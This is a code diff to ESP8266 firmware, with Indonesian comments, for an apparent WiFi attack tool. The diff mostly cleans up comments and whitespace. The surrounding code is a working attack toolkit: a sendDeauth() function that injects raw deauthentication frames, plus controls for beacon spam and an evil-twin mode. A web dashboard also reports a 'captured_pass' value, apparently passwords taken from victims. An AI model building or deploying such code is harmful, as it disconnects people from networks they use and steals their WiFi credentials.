@@ -4,13 +4,13 @@
 #include <FS.h>
 #include <LittleFS.h>
 #include <DNSServer.h>
+#include <ArduinoJson.h> // Pastikan ini ada
 
 extern "C" {
   #include "user_interface.h"
 }
 
-// FIX: Karena compiler generic gak kenal D4, kita definisikan manual di sini
-// Ini gak ngerubah fungsi, cuma ngasih tau compiler kalau D4 itu GPIO 2
+// FIX: Mapping pin LED D4 untuk compiler generic
 #ifndef D4
 #define D4 2
 #endif
@@ -25,9 +25,9 @@ uint32_t de_pkt = 0, be_pkt = 0;
 
 AsyncWebServer server(80);
 DNSServer dnsServer;
-const int LED = D4; // Sekarang compiler bakal kenal D4 karena sudah di-define di atas
+const int LED = D4;
 
-// --- UI ASLI GMPRO87 (UTUH 100% - TIDAK ADA YG DISUNAT) ---
+// --- UI ASLI GMPRO87 (UTUH 100%) ---
 const char INDEX_HTML[] PROGMEM = R"rawtext(
 <!DOCTYPE html>
 <html>
@@ -78,7 +78,6 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
         <button class="tab-btn active-tab" onclick="openTab('dash', this)">DASHBOARD</button>
         <button class="tab-btn" onclick="openTab('webset', this)">SETTINGS</button>
     </div>
-
     <div id="dash">
         <div class='ctrl'>
             <div class="cmd-box scan-box">
@@ -118,7 +117,6 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
             </div>
         </div>
     </div>
-
     <div id="webset" class="hidden">
         <div class='set-box'>
             <b style='color:orange'>BEACON SPAM CONFIG:</b><br>
@@ -135,12 +133,10 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
             </div>
         </div>
     </div>
-
     <div id="previewModal">
         <div class="modal-content" id="previewContainer"></div>
         <button onclick="closePreview()" class="btn-ok" style="margin-top:20px; background:red; color:white; width:100%">CLOSE PREVIEW</button>
     </div>
-
     <script>
         function openTab(id, b) {
             document.getElementById('dash').className = (id=='dash'?'':'hidden');
@@ -159,7 +155,6 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
             document.getElementById('previewModal').style.display = 'block';
         }
         function closePreview() { document.getElementById('previewModal').style.display = 'none'; }
-
         setInterval(() => {
             fetch('/stat').then(r=>r.json()).then(d=>{
                 document.getElementById('curPass').innerText = d.p;
@@ -177,7 +172,6 @@ const char INDEX_HTML[] PROGMEM = R"rawtext(
 </html>
 )rawtext";
 
-// --- ATTACK CORE ---
 void sendDeauth() {
   uint8_t pkt[26] = {0xc0,0x00,0x3a,0x01,0xff,0xff,0xff,0xff,0xff,0xff,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x22,0x00,0x00,0x01,0x00};
   wifi_send_pkt_freedom(pkt, 26, 0); de_pkt++;
@@ -187,13 +181,10 @@ void setup() {
   Serial.begin(115200);
   pinMode(LED, OUTPUT); digitalWrite(LED, HIGH);
   LittleFS.begin();
-
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(admin_ssid, admin_pass);
   dnsServer.start(53, "*", WiFi.softAPIP());
-
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });
-
   server.on("/api", HTTP_GET, [](AsyncWebServerRequest *r){
     if(r->hasParam("c")) {
       String c = r->getParam("c")->value();
@@ -202,18 +193,14 @@ void setup() {
       if(c=="beacon") be_on = !be_on;
       if(c=="etwin") et_on = !et_on;
       if(c=="clear") captured_pass = "Waiting...";
-      if(c=="set") {
-        if(r->hasParam("s")) target_ssid = r->getParam("s")->value();
-      }
+      if(c=="set") { if(r->hasParam("s")) target_ssid = r->getParam("s")->value(); }
     }
     r->send(200);
   });
-
   server.on("/stat", HTTP_GET, [](AsyncWebServerRequest *r){
     String j = "{\"de\":"+String(de_on)+",\"ma\":"+String(ma_on)+",\"be\":"+String(be_on)+",\"et\":"+String(et_on)+",\"p\":\""+captured_pass+"\",\"dp\":"+String(de_pkt)+",\"bp\":"+String(be_pkt)+"}";
     r->send(200, "application/json", j);
   });
-
   server.onNotFound([](AsyncWebServerRequest *r){ r->send_P(200, "text/html", INDEX_HTML); });
   server.begin();
 }
